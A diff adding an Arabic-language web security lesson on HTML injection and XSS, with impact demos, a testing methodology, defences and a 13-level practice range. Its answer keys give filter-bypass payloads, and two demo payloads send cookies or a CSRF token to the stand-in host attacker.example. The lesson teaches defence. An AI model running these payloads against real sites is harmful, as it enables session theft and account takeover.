@@ -1,0 +1,412 @@
+      <section class="section" id="s16" data-part="الجزء 1 · HTML" data-pk="html" data-nav="HTML Injection والـ XSS" data-icon="💉" data-keywords="html injection xss cross-site scripting reflected stored dom-based payload context canary event handler onerror alert print document.domain cookie httponly dangling markup content spoofing xss range filter bypass blocklist output encoding sanitizer dompurify csp">
+        <div class="section-head">
+          <span class="section-index">16</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 16 · ختام الجزء الأول</p>
+            <h2>HTML Injection والـ XSS: كل اللي فات في هجمة واحدة</h2>
+            <p class="lede">لو input المستخدم وصل للصفحة في مكان المتصفح بيفسّره فيه كـ <b>markup</b> أو <b>كود</b>، يبقى عندك <b>injection</b>. لو قدرت تشغّل JavaScript، اسمها <b>Cross-Site Scripting (XSS)</b> — كودك بيشتغل جوه origin الموقع، بصلاحيات الضحية. الدرس ده بيجمع الـ parser والـ contexts والـ encoding في منهجية واحدة، وبعدها <b>XSS Range</b> من 13 مستوى تكسرهم بنفسك جوه sandbox.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">ليه XSS خطير؟</h3>
+        <div class="grid-3">
+          <div class="card reveal"><div class="ico">🍪</div><h4>سرقة الجلسة</h4><p>لو الـ session cookie مش <code>HttpOnly</code>: <code>document.cookie</code> يتبعت للمهاجم = دخول للحساب.</p></div>
+          <div class="card reveal"><div class="ico">🎭</div><h4>أفعال باسم الضحية</h4><p>حتى مع HttpOnly: الكود يقدر يبعت requests من جوه الموقع (تغيير إيميل، تحويل، إضافة admin) والمتصفح يلزق الـ cookies.</p></div>
+          <div class="card reveal"><div class="ico">🎣</div><h4>Phishing على دومين حقيقي</h4><p>يرسم فورم login مزيفة على <code>bank.example</code> نفسه — مفيش علامة تحذير ولا دومين غريب.</p></div>
+          <div class="card reveal"><div class="ico">⌨️</div><h4>تجسس</h4><p>keylogger على الصفحة، قراية أي بيانات ظاهرة (رسايل، بيانات بطاقة)، أو الـ CSRF tokens.</p></div>
+          <div class="card reveal"><div class="ico">🐛</div><h4>دودة</h4><p>Stored XSS بينشر نفسه: «Samy worm» على MySpace سنة 2005 ضاف أكتر من مليون صديق في أقل من 24 ساعة.</p></div>
+          <div class="card reveal"><div class="ico">🧩</div><h4>نقطة دخول</h4><p>بداية سلسلة: XSS في admin panel = سيطرة على الموقع؛ وXSS في تطبيق Electron ممكن يوصل لتنفيذ أوامر على الجهاز.</p></div>
+        </div>
+
+        <h3 class="sub">الأنواع التلاتة</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>النوع</th><th>الـ payload بيتخزن فين؟</th><th>مثال</th></tr></thead>
+          <tbody>
+            <tr><td><b>Reflected</b></td><td>مبيتخزنش: بيرجع في نفس الـ response (من الـ URL أو الفورم)</td><td><code>/search?q=&lt;img src=x onerror=…&gt;</code> والمهاجم يبعت اللينك للضحية</td></tr>
+            <tr><td><b>Stored</b></td><td>في الـ database ويتعرض لكل اللي يفتح الصفحة</td><td>تعليق، اسم مستخدم، رسالة دعم فني بيقراها الـ admin</td></tr>
+            <tr><td><b>DOM-based</b></td><td>الـ response سليم؛ JavaScript في الصفحة بياخد input ويحطه في sink خطير</td><td><code>el.innerHTML = location.hash.slice(1)</code></td></tr>
+          </tbody>
+        </table></div>
+        <scene id="sc-reflected" title="Reflected XSS من البداية للنهاية">
+          <svg viewBox="0 0 1000 280" role="img" aria-label="مراحل reflected XSS">
+            <rect x="20" y="30" width="200" height="90" rx="14" class="d-box5" data-s="1,5"/>
+            <text x="120" y="66" text-anchor="middle" class="d-tb d-red">Attacker</text>
+            <text x="120" y="90" text-anchor="middle" class="d-tx">attacker.example</text>
+            <rect x="400" y="30" width="200" height="90" rx="14" class="d-box" data-s="2,4"/>
+            <text x="500" y="66" text-anchor="middle" class="d-tb d-acc">Victim's browser</text>
+            <text x="500" y="90" text-anchor="middle" class="d-tx">logged in to shop.example</text>
+            <rect x="780" y="30" width="200" height="90" rx="14" class="d-box2" data-s="2-3"/>
+            <text x="880" y="66" text-anchor="middle" class="d-tb d-vio">shop.example</text>
+            <text x="880" y="90" text-anchor="middle" class="d-tx">/search?q=…</text>
+            <g data-from="1"><path class="d-ar-red d-flow" d="M222,60 L396,60"/><text x="310" y="50" text-anchor="middle" class="d-tx">① crafted link</text></g>
+            <g data-from="2"><path class="d-ar-acc d-flow" d="M602,60 L776,60"/><text x="690" y="50" text-anchor="middle" class="d-tx">② GET /search?q=&lt;img…&gt;</text></g>
+            <g data-from="3"><path class="d-ar-vio d-flow" d="M776,100 L602,100"/><text x="690" y="138" text-anchor="middle" class="d-tx">③ HTML with the payload, unencoded</text></g>
+            <g data-from="4"><rect x="400" y="160" width="200" height="60" rx="12" class="d-box3"/><text x="500" y="186" text-anchor="middle" class="d-tb d-amb">④ payload runs</text><text x="500" y="206" text-anchor="middle" class="d-tx">origin = shop.example</text></g>
+            <g data-from="5"><path class="d-ar-red d-flow" d="M398,195 C300,195 200,180 130,124"/><text x="250" y="240" text-anchor="middle" class="d-tx d-red">⑤ cookies / data / actions</text></g>
+          </svg>
+          <step>المهاجم بيبني لينك فيه payload في parameter (<code>?q=…</code>)، ويبعته للضحية: إيميل، رسالة، إعلان، أو حتى iframe خفي في صفحة.</step>
+          <step>الضحية (اللي عاملة login في <code>shop.example</code>) بتفتح اللينك، والمتصفح بيبعت الـ request ومعاه الـ cookies.</step>
+          <step>السيرفر بيحط قيمة <code>q</code> في الـ HTML <b>من غير encoding</b> («No results for: …»).</step>
+          <step>المتصفح بيـ parse الـ response: الـ payload بقى element بـ event handler، والكود بيتنفّذ <b>بـ origin <code>shop.example</code></b> — يعني ليه نفس صلاحيات كود الموقع.</step>
+          <step>الكود بيبعت اللي يقدر يوصله للمهاجم، أو بيعمل actions باسم الضحية.</step>
+        </scene>
+
+        <h3 class="sub">الـ Impact عمليًا: إيه اللي الـ payload شايفه؟</h3>
+        <p>الصفحة دي «السيرفر» بتاعها حط 3 cookies: <code>session</code> (عليها HttpOnly)، و<code>theme</code>، و<code>lang</code>. الـ payload المحقون بيقرا <code>document.cookie</code> ويحاول يبعتها لسيرفر المهاجم (الـ sandbox مانع أي network، فمحدش هيستلم حاجة):</p>
+        <html-example file="impact.html" auto mode="xss" url="https://shop.example/profile" cookies="session=7f3a9c2e1b; HttpOnly | theme=dark | lang=ar">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Profile</title></head>
+          <body>
+            <!-- the server reflected the "name" parameter here, unencoded: -->
+            <p>Profile of: <img src=x onerror="console.log('document.cookie =', JSON.stringify(document.cookie)); new Image().src='https://attacker.example/c?d='+encodeURIComponent(document.cookie);"></p>
+          </body>
+          </html>
+        </html-example>
+        <p>الـ <code>session</code> مش ظاهرة — ده دور <code>HttpOnly</code>. بس متفتكرش إن ده يقفل الـ XSS: الكود لسه يقدر يعمل <code>fetch("/account/email", {method:"POST", …})</code> والمتصفح يلزق الـ session cookie لوحده. HttpOnly بيقلل الـ impact مش بيلغيه.</p>
+        <div class="callout info reveal"><span class="ci">🧪</span><div><strong>الـ PoC المحترم</strong><p>في التقارير استخدم <code>alert(document.domain)</code> (بيثبت <b>أنهي origin</b> الكود اشتغل فيه — مهم لو الـ payload وقع في iframe على دومين تاني)، أو <code>print()</code> لأن Chrome بيمنع <code>alert</code> من iframes cross-origin. ومتستخدمش payloads بتسرق بيانات حقيقية أو بتأثر على مستخدمين حقيقيين — الـ PoC يثبت التنفيذ وبس.</p></div></div>
+
+        <h3 class="sub">HTML injection من غير JavaScript</h3>
+        <p>حتى لو الـ JS ممنوع خالص (CSP قوي، أو فلتر بيشيل كل الـ handlers)، حقن HTML لوحده ليه impact:</p>
+        <div class="grid-2">
+          <div class="card reveal"><div class="ico">📝</div><h4>Content spoofing</h4><p>رسالة مزيفة على موقع موثوق: «حسابك موقوف، كلّم الرقم ده».</p></div>
+          <div class="card reveal"><div class="ico">🪝</div><h4>Form/base hijacking</h4><p><code>formaction</code> على زرار، <code>&lt;form&gt;</code> مفتوحة قبل فورم حقيقية، أو <code>&lt;base href&gt;</code> قبل scripts (الدروس 04 و09 و13).</p></div>
+          <div class="card reveal"><div class="ico">🧹</div><h4>DOM clobbering</h4><p><code>id</code>/<code>name</code> بتلبس متغيرات الـ JS (الدرس 07).</p></div>
+          <div class="card reveal"><div class="ico">💧</div><h4>Dangling markup</h4><p>attribute متفتحش اتقفل «بيبلع» باقي الصفحة لحد أول quote — ومعاه tokens سرية — ويبعتها في URL.</p></div>
+        </div>
+        <p>جرّب الـ <b>dangling markup</b>: المهاجم حقن <code>&lt;a href='https://attacker.example/log?d=</code> بس (من غير ما يقفل الـ quote). الـ href «بلع» الفورم اللي بعده لحد أول <code>'</code> في الصفحة. دوس على اللينك (الكلام اللي بعد الفورم) وبص على الـ URL:</p>
+        <html-example file="dangling.html" auto url="https://shop.example/account" mode="xss">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Account</title></head>
+          <body>
+            <p>Hello <a href='https://attacker.example/log?d=</p>
+            <form action="/transfer" method="post">
+              <input type="hidden" name="csrf" value="9f8e7d6c5b4a">
+              <button>Send money</button>
+            </form>
+            <p>Don't share your token. Click to continue.</p>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>ليه dangling markup مهم؟</strong><p>بيشتغل حتى مع CSP صارمة بتمنع كل الـ scripts، لأنه مش بيشغّل كود — بيستخدم سلوك HTML عادي (لينك/صورة/فورم) عشان يسرّب أسرار الصفحة (CSRF tokens، بيانات شخصية). نسخة الـ <code>&lt;img src='…</code> بتسرّب أوتوماتيك من غير ضغطة (المتصفحات الحديثة بتمنع بعض الحالات، زي الـ URLs اللي فيها newline و<code>&lt;</code> مع بعض، فالمهاجمين بيدوّروا على بدايل).</p></div></div>
+
+        <h3 class="sub">المنهجية: من الـ canary للـ payload</h3>
+        <div class="steps">
+          <div class="step"><span class="n">01</span><div><h4>ابعت canary فريد</h4><p>كلمة مش هتتكرر صدفة زي <code>wm7x9z'"&lt;&gt;</code> في كل parameter (URL، فورم، headers، الـ JSON).</p></div></div>
+          <div class="step"><span class="n">02</span><div><h4>دوّر عليه في الـ response</h4><p>Burp → Search / Ctrl+F في الـ source. ممكن يظهر في أكتر من مكان — كل مكان context مختلف. ولو مظهرش: تابع الـ DOM (DOM XSS) وصفحات تانية (stored).</p></div></div>
+          <div class="step"><span class="n">03</span><div><h4>حدد الـ context</h4><p>نص؟ attribute (بـ quotes ولا من غير)؟ URL؟ جوه script؟ جوه comment/textarea/title؟ (مصفوفة الدرس 14).</p></div></div>
+          <div class="step"><span class="n">04</span><div><h4>شوف إيه اللي اتعمله encode</h4><p>هل <code>'</code> و<code>"</code> و<code>&lt;</code> و<code>&gt;</code> رجعوا زي ما هما؟ اتشالوا؟ اتحولوا entities؟ ده بيقولك تقدر «تخرج» من الـ context ولا لأ.</p></div></div>
+          <div class="step"><span class="n">05</span><div><h4>ابني الـ payload الأقل</h4><p>اخرج من الـ context بأقل حروف، وبعدين اختار طريقة تنفيذ: event handler بيشتغل لوحده، أو <code>javascript:</code> URL، أو script.</p></div></div>
+          <div class="step"><span class="n">06</span><div><h4>لو فيه فلتر: افهمه ومتخمّنش</h4><p>جرّب حرف حرف وكلمة كلمة: إيه اللي بيتمسك؟ وبعدين استخدم قواعد الـ parser (الدرس 13) والـ encoding (الدرس 14) عشان تعدّي.</p></div></div>
+        </div>
+
+        <h3 class="sub">🏴 XSS Range</h3>
+        <p>كل مستوى «سيرفر» صغير كوده مكشوف قدامك (white-box). الـ payload بتاعك بيتحط مكان <code>input</code>، والصفحة الناتجة بتتعرض في <b>sandboxed iframe</b> (من غير network). الهدف: تشغّل <code>alert()</code> (أو <code>confirm</code>/<code>prompt</code>/<code>print</code>). اقرا الكود، شوف الـ response، وفكّر في الـ context قبل ما تجرّب.</p>
+
+        <xss-level id="xss-1" n="1" title="Hello, reflection" url="https://victim.example/search">
+          <desc><p>صفحة بحث بتعرض كلمة البحث زي ما هي. ابدأ بالكلاسيكي.</p></desc>
+          <server>
+            return `<!DOCTYPE html>
+            <html><head><title>Search</title></head>
+            <body style="font-family:system-ui">
+              <h3>Shop search</h3>
+              <p>No results for: ${input}</p>
+            </body></html>`;
+          </server>
+          <solution><script>alert(1)</script></solution>
+          <hint>مفيش أي فلتر. الـ input واقع في نص الـ body.</hint>
+          <explain>مفيش encoding خالص، فـ `<script>` بقى عنصر حقيقي. الإصلاح: HTML-encode لـ `< > & " '` قبل الإخراج.</explain>
+        </xss-level>
+
+        <xss-level id="xss-2" n="2" title="No scripts allowed" url="https://victim.example/welcome">
+          <desc><p>المطوّر «صلّح» المشكلة بإنه يمسح أي tag <code>script</code>.</p></desc>
+          <server>
+            const clean = input.replace(/<\/?script[^>]*>/gi, "");
+            return `<!DOCTYPE html>
+            <html><head><title>Welcome</title></head>
+            <body style="font-family:system-ui">
+              <p>Welcome back, ${clean}!</p>
+            </body></html>`;
+          </server>
+          <solution><img src=x onerror=alert(1)></solution>
+          <blocked><script>alert(1)</script></blocked>
+          <hint>فيه tags كتير غير script بتشغّل JS. فكّر في عنصر بيحمّل حاجة وبيفشل.</hint>
+          <explain>الـ blocklist شالت `<script>` بس، وأي event handler على أي عنصر بيشغّل JS. `<img src=x onerror=…>`: الصورة بتفشل والـ handler يشتغل لوحده. الدرس: blocklists دايمًا ناقصة.</explain>
+        </xss-level>
+
+        <xss-level id="xss-3" n="3" title="Inside a quoted attribute" url="https://victim.example/profile">
+          <desc><p>اسم الصورة بتاعتك بيتحط جوه <code>src</code>. الـ <code>&lt;</code> و<code>&gt;</code> بيتعملهم encode.</p></desc>
+          <server>
+            const v = input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            return `<!DOCTYPE html>
+            <html><head><title>Profile</title></head>
+            <body style="font-family:system-ui">
+              <h3>Your avatar</h3>
+              <img src="/avatars/${v}.png" alt="Your avatar" width="64" height="64">
+            </body></html>`;
+          </server>
+          <solution>x" onerror="alert(1)" x="</solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <hint>مش محتاج tag جديد. الـ `"` مش متعمّلها encode… والعنصر نفسه `img` بيحمّل صورة.</hint>
+          <explain>الـ `"` قفلت قيمة الـ `src`، وبعدها ضفت attribute جديد `onerror` على نفس الـ img (والـ `x="` في الآخر بتمتص الـ `.png"` عشان الـ HTML يفضل نضيف). الإصلاح: encode لـ `"` (و`'`) في الـ attributes.</explain>
+        </xss-level>
+
+        <xss-level id="xss-4" n="4" title="Unquoted attribute" url="https://victim.example/gallery">
+          <desc><p>المرة دي كل الـ quotes والأقواس الزاوية متعمّلها encode. بس بص كويس على الـ attribute.</p></desc>
+          <server>
+            const enc = { "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
+            const v = input.replace(/[<>"']/g, c => enc[c]);
+            return `<!DOCTYPE html>
+            <html><head><title>Gallery</title></head>
+            <body style="font-family:system-ui">
+              <img src=/img/${v}.jpg alt=photo width=64 height=64>
+            </body></html>`;
+          </server>
+          <solution>x onerror=alert(1)//</solution>
+          <blocked>x" onerror="alert(1)</blocked>
+          <hint>قيمة من غير quotes بتخلص عند إيه؟ (الدرس 02 و13)</hint>
+          <explain>القيمة غير المحوطة بـ quotes بتخلص عند أول <b>مسافة</b> — مش محتاج ولا حرف من اللي اتعمّلهم encode. والـ `//` بتعمل comment للـ `.jpg` اللي بعدها جوه الـ JS. الإصلاح: quotes دايمًا حوالين قيم الـ attributes.</explain>
+        </xss-level>
+
+        <xss-level id="xss-5" n="5" title="Inside a JavaScript string" url="https://victim.example/search">
+          <desc><p>كلمة البحث بتتحط جوه string في script. السيرفر بيعمل escape للـ <code>'</code> وencode للـ <code>&lt; &gt;</code>.</p></desc>
+          <server>
+            const v = input.replace(/'/g, "\\'").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            return `<!DOCTYPE html>
+            <html><head><title>Search</title></head>
+            <body style="font-family:system-ui">
+              <p id="out"></p>
+              <script>
+                var q = '${v}';
+                document.getElementById("out").textContent = "You searched for: " + q;
+              </script>
+            </body></html>`;
+          </server>
+          <solution>\';alert(1);//</solution>
+          <blocked>';alert(1);//</blocked>
+          <blocked></script><img src=x onerror=alert(1)></blocked>
+          <hint>السيرفر بيحط `\` قبل الـ `'`. طب لو إنت كتبت `\` قبلها؟ إيه اللي هيحصل للـ backslash بتاعه؟</hint>
+          <explain>الـ input `\'` بقى `\\'`: الـ `\\` = backslash حرفي، والـ `'` بقت حرة وقفلت الـ string. الإصلاح الصح: escape للـ `\` <b>كمان</b> (أو أحسن: `JSON.stringify` مع `<` → `\u003c`). الـ escaping الجزئي أخطر من مفيش.</explain>
+        </xss-level>
+
+        <xss-level id="xss-6" n="6" title="javascript: is blocked" url="https://victim.example/u/omar" click="#site">
+          <desc><p>«الويبسايت الشخصي» بيتحط في <code>href</code>. أي قيمة فيها <code>javascript:</code> بتتمسح. (المستوى ده محتاج تدوس على اللينك في المعاينة.)</p></desc>
+          <server>
+            let v = input.replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            if (/javascript:/i.test(v)) v = "#blocked";
+            return `<!DOCTYPE html>
+            <html><head><title>Profile</title></head>
+            <body style="font-family:system-ui">
+              <p>Website: <a id="site" href="${v}">my website</a></p>
+            </body></html>`;
+          </server>
+          <solution>java&#x09;script:alert(1)</solution>
+          <blocked>javascript:alert(1)</blocked>
+          <blocked>JaVaScRiPt:alert(1)</blocked>
+          <hint>الفلتر بيشوف النص قبل ما المتصفح يفك الـ entities… والـ URL parser بيشيل tabs.</hint>
+          <explain>`&#x09;` مش «javascript:» كنص، فالفلتر عدّاه. بس المتصفح فك الـ entity لـ tab، والـ URL parser شال الـ tab → `javascript:alert(1)`. (و`&#106;avascript:` كمان شغّالة.) الإصلاح: parse الـ URL زي المتصفح وallow-list للـ schemes.</explain>
+        </xss-level>
+
+        <xss-level id="xss-7" n="7" title="Trapped in a textarea" url="https://victim.example/settings">
+          <desc><p>الـ bio بتاعك بيرجع جوه <code>textarea</code> عشان تعدّله. الـ script tags بتتمسح.</p></desc>
+          <server>
+            const v = input.replace(/<\/?script[^>]*>/gi, "");
+            return `<!DOCTYPE html>
+            <html><head><title>Settings</title></head>
+            <body style="font-family:system-ui">
+              <form><label>Your bio:<br><textarea name="bio" rows="3" cols="40">${v}</textarea></label></form>
+            </body></html>`;
+          </server>
+          <solution></textarea><img src=x onerror=alert(1)></solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <hint>جوه textarea مفيش tags خالص (RCDATA). إيه الحاجة الوحيدة اللي بتخرّجك؟</hint>
+          <explain>RCDATA: كل حاجة نص لحد `</textarea>`. فالأول تقفلها، وبعدها أنت في الـ body. الإصلاح: HTML-encode (اللي بيحوّل `<` في `</textarea>` لـ `&lt;`).</explain>
+        </xss-level>
+
+        <xss-level id="xss-8" n="8" title="No event handlers… right?" url="https://victim.example/comments">
+          <desc><p>الفلتر بيمسح الـ scripts، وأي <code>on…=</code> قبله <b>مسافة</b> بيتحول لـ <code>data-x=</code>.</p></desc>
+          <server>
+            const v = input.replace(/<\/?script[^>]*>/gi, "").replace(/\son\w+\s*=/gi, " data-x=");
+            return `<!DOCTYPE html>
+            <html><head><title>Comments</title></head>
+            <body style="font-family:system-ui">
+              <div class="comment">${v}</div>
+            </body></html>`;
+          </server>
+          <solution><img src="x"/onerror=alert(1)></solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <blocked><img src=x	onerror=alert(1)></blocked>
+          <hint>الـ regex بيدوّر على `\s` قبل `on`. الـ tokenizer بيقبل حاجة تانية كفاصل بين الـ attributes… (بس خلي بالك: جوه قيمة من غير quotes الحرف ده بيبقى جزء من القيمة.)</hint>
+          <explain>الـ `/` فاصل صحيح بين الـ attributes في الـ tokenizer، والـ regex بيدوّر على whitespace بس. ليه `src="x"` بـ quotes؟ لأن `src=x/onerror=…` من غير quotes كانت هتبقى كلها <b>قيمة</b> واحدة للـ src. (و`<svg/onload=alert(1)>` حل تاني.)</explain>
+        </xss-level>
+
+        <xss-level id="xss-9" n="9" title="No parentheses" url="https://victim.example/hello">
+          <desc><p>الفلتر بيمسح أي <code>(</code> أو <code>)</code> — وكمان الـ script tags.</p></desc>
+          <server>
+            const v = input.replace(/[()]/g, "").replace(/<\/?script[^>]*>/gi, "");
+            return `<!DOCTYPE html>
+            <html><head><title>Hello</title></head>
+            <body style="font-family:system-ui">
+              <p>Hello ${v}</p>
+            </body></html>`;
+          </server>
+          <solution><img src=x onerror=alert`1`></solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <hint>في JavaScript فيه طريقة تنادي بيها function من غير أقواس (tagged templates)… أو: الـ attribute بيفك entities قبل الـ JS.</hint>
+          <explain>طريقتين: <code>alert&#96;1&#96;</code> (tagged template = استدعاء من غير أقواس)، أو <code>onerror="alert&amp;#40;1&amp;#41;"</code> — الـ entities بتتفك لأقواس قبل ما الـ JS يشوفها. الفلتر شغّال على النص الخام بس.</explain>
+        </xss-level>
+
+        <xss-level id="xss-10" n="10" title="Delete the bad words" url="https://victim.example/board">
+          <desc><p>الفلتر بيمسح كلمة <code>script</code> وكلمات <code>onerror</code>/<code>onload</code> من أي حتة (case-insensitive).</p></desc>
+          <server>
+            const v = input.replace(/script/gi, "").replace(/onerror|onload/gi, "");
+            return `<!DOCTYPE html>
+            <html><head><title>Board</title></head>
+            <body style="font-family:system-ui">
+              <div class="post">${v}</div>
+            </body></html>`;
+          </server>
+          <solution><img src=x oneonerrorrror=alert(1)></solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <blocked><svg onload=alert(1)></blocked>
+          <hint>الـ replace بيعدّي مرة واحدة بس. لو الكلمة الممنوعة نفسها «مقسومة» حوالين نسخة تانية منها؟</hint>
+          <explain>`oneonerrorrror`: الفلتر شال `onerror` اللي في النص، والباقي اتلزق: `one` + `rror` = `onerror`. نفس الفكرة: `<scrscriptipt>`. وكمان handlers تانية زي `ontoggle` مش في القايمة أصلًا. الإصلاح: مفيش «تنظيف» بالـ replace — encoding أو sanitizer حقيقي.</explain>
+        </xss-level>
+
+        <xss-level id="xss-11" n="11" title="DOM sink" url="https://victim.example/greet">
+          <desc><p>السيرفر المرة دي <b>آمن</b>: بيحط الاسم في JSON بـ escaping صح. بس كود الصفحة نفسه بيعمل حاجة بالاسم ده…</p></desc>
+          <server>
+            const data = JSON.stringify({ name: input }).replace(/</g, "\\u003c");
+            return `<!DOCTYPE html>
+            <html><head><title>Greeting</title></head>
+            <body style="font-family:system-ui">
+              <div id="msg"></div>
+              <script>
+                var params = ${data};
+                document.getElementById("msg").innerHTML = "Hello, " + params.name + "!";
+              </script>
+            </body></html>`;
+          </server>
+          <solution><img src=x onerror=alert(1)></solution>
+          <blocked><script>alert(1)</script></blocked>
+          <hint>الـ sink هو `innerHTML`. إيه اللي بيشتغل لما يدخل بـ innerHTML وإيه اللي مبيشتغلش؟ (الدرس 13)</hint>
+          <explain>ده <b>DOM XSS</b>: الـ response سليم، والمشكلة في `innerHTML` في كود الـ client. `<script>` مبيتنفّذش من innerHTML، بس `<img onerror>` بيتنفّذ. الإصلاح: `textContent` بدل `innerHTML` للنص.</explain>
+        </xss-level>
+
+        <xss-level id="xss-12" n="12" title="Hidden in a comment" url="https://victim.example/search">
+          <desc><p>آخر بحث بيتسجّل في HTML comment للـ debugging. الفلتر بيمسح <code>--&gt;</code>.</p></desc>
+          <server>
+            const v = input.replace(/-->/g, "");
+            return `<!DOCTYPE html>
+            <html><head><title>Search</title></head>
+            <body style="font-family:system-ui">
+              <!-- debug: last search = ${v} -->
+              <p>Search results will appear here.</p>
+            </body></html>`;
+          </server>
+          <solution>--!><img src=x onerror=alert(1)></solution>
+          <blocked>--><img src=x onerror=alert(1)></blocked>
+          <hint>الدرس 13: الـ comment بيخلص بطريقتين.</hint>
+          <explain>`--!>` بتقفل الـ comment (parse error بس شغّالة). الإصلاح: متحطش input مستخدمين في comments أصلًا.</explain>
+        </xss-level>
+
+        <xss-level id="xss-13" n="13" title="The WAF" url="https://victim.example/hello">
+          <desc><p>WAF بيرفض أي request فيه tags من القايمة دي: <code>script img svg iframe object embed body style link meta a math</code>. الـ event handlers مسموحة.</p></desc>
+          <server>
+            if (/<\s*\/?\s*(script|img|svg|iframe|object|embed|body|style|link|meta|a|math)\b/i.test(input))
+              return "<!DOCTYPE html><body style='font-family:system-ui'><p>🚫 Request blocked by WAF</p></body>";
+            return `<!DOCTYPE html>
+            <html><head><title>Hello</title></head>
+            <body style="font-family:system-ui">
+              <p>Hello ${input}</p>
+            </body></html>`;
+          </server>
+          <solution><details open ontoggle=alert(1)></solution>
+          <blocked><img src=x onerror=alert(1)></blocked>
+          <blocked><svg onload=alert(1)></blocked>
+          <hint>الدرس 07: فيه عنصر تفاعلي native، لو اتفتح وقت الـ parsing بيطلّع event لوحده.</hint>
+          <explain>`<details open ontoggle=…>`: الـ `open` بيعمل `toggle` event تلقائيًا. بدايل كمان: `<audio src=x onerror=…>` أو `<video><source onerror=…>`. القايمة السودا مستحيل تبقى كاملة — وده سبب إن الحل الحقيقي encoding/sanitization + CSP مش WAF rules.</explain>
+        </xss-level>
+
+        <h3 class="sub">الدفاع (ملخص — والجزء الرابع بالتفصيل)</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الطبقة</th><th>إيه هي</th></tr></thead>
+          <tbody>
+            <tr><td><b>Output encoding حسب الـ context</b></td><td>الحل الأساسي: templating engine بيعمل auto-escape، ومتكسرهوش. لكل context الـ encoding بتاعه (الدرس 14).</td></tr>
+            <tr><td><b>Sanitization</b> للـ HTML المسموح</td><td>لو لازم تقبل HTML (rich text): <b>DOMPurify</b> أو Sanitizer API — مش regex.</td></tr>
+            <tr><td><b>APIs آمنة</b> في الـ JS</td><td><code>textContent</code> بدل <code>innerHTML</code>، و<code>setAttribute</code> مع allow-list للـ URLs، وTrusted Types لقفل الـ sinks.</td></tr>
+            <tr><td><b>CSP</b></td><td><code>script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'</code> — بتمنع الـ inline scripts والـ handlers حتى لو الـ injection حصل.</td></tr>
+            <tr><td><b>Cookies</b></td><td><code>HttpOnly; Secure; SameSite=Lax</code> بتقلل الـ impact.</td></tr>
+          </tbody>
+        </table></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 16</h3></div>
+          <quiz id="s16-q1" answer="2">
+            <q>الـ response سليم 100% (مفيش input بيترجع)، بس الـ JS بيعمل `el.innerHTML = location.hash.slice(1)`. ده نوعه إيه؟</q>
+            <o>Reflected XSS</o>
+            <o>Stored XSS</o>
+            <o>DOM-based XSS</o>
+            <o>مش ثغرة لأن السيرفر سليم</o>
+            <good>الـ source (`location.hash`) والـ sink (`innerHTML`) الاتنين في المتصفح. والـ fragment مبيوصلش للسيرفر خالص، فالـ WAF مش هيشوفه.</good>
+            <bad>DOM XSS = الثغرة في كود الـ client. السيرفر سليم والـ payload مبيعدّيش عليه أصلًا.</bad>
+          </quiz>
+          <quiz id="s16-q2" answer="0">
+            <q>الـ session cookie عليها `HttpOnly`. لقيت stored XSS في صفحة الـ profile. الـ impact؟</q>
+            <o>لسه عالي: الكود يقدر يعمل requests باسم الضحية (تغيير إيميل، إلخ) والمتصفح يلزق الـ cookie</o>
+            <o>مفيش impact لأن الـ cookie محمية</o>
+            <o>بس defacement</o>
+            <o>بس لو الضحية admin</o>
+            <good>HttpOnly بتمنع <b>قراية</b> الـ cookie بس. الكود شغّال في نفس الـ origin وبيستخدم الجلسة زي صاحبها.</good>
+            <bad>`HttpOnly` بيقلل الـ impact (مفيش سرقة cookie مباشرة)، بس الـ XSS لسه بيتحكم في كل حاجة الضحية تقدر تعملها من المتصفح.</bad>
+          </quiz>
+          <quiz id="s16-q3" answer="3">
+            <q>بعت canary `wm7x9z'"<>` ولقيته في الـ response كده: `<input value="wm7x9z'&quot;&lt;&gt;">`. الاستنتاج؟</q>
+            <o>تقدر تخرج من الـ attribute بـ `"`</o>
+            <o>تقدر تفتح tag جديد</o>
+            <o>الـ `'` هتخرّجك</o>
+            <o>القيمة بين `"` والـ `"` و`<` و`>` متعمّلهم encode — الـ context ده آمن غالبًا؛ دوّر على canary في أماكن تانية</o>
+            <good>الـ `'` مش مشكلة لأن الـ attribute بين double quotes. اتنقل لـ parameters أو contexts تانية.</good>
+            <bad>الـ quote اللي بتقفل الـ attribute هنا هي `"`، وهي متعمّلها encode. والـ `<>` كمان. فمفيش خروج من هنا.</bad>
+          </quiz>
+          <quiz id="s16-q4" answer="1">
+            <q>ليه `alert(document.domain)` أحسن من `alert(1)` في التقرير؟</q>
+            <o>أسرع</o>
+            <o>بيثبت أنهي origin الكود اشتغل فيه (مهم لو الـ payload وقع في iframe أو sandbox على دومين تاني)</o>
+            <o>بيسرق الدومين</o>
+            <o>مفيش فرق</o>
+            <good>XSS على `sandbox-cdn.example` غير XSS على `bank.example`. الـ document.domain بيوضّح الـ impact.</good>
+            <bad>الهدف من الـ PoC إثبات التنفيذ <b>في origin الضحية</b>. `document.domain` بيعرض ده صراحة.</bad>
+          </quiz>
+          <quiz id="s16-q5" answer="2">
+            <q>CSP قوية بتمنع كل الـ inline scripts والـ handlers، وعندك HTML injection. أنهي هجمة لسه ممكنة؟</q>
+            <o>`<img src=x onerror=alert(1)>`</o>
+            <o>`<script>alert(1)</script>`</o>
+            <o>dangling markup لتسريب CSRF token، أو form hijacking (لو مفيش `form-action`)</o>
+            <o>ولا حاجة</o>
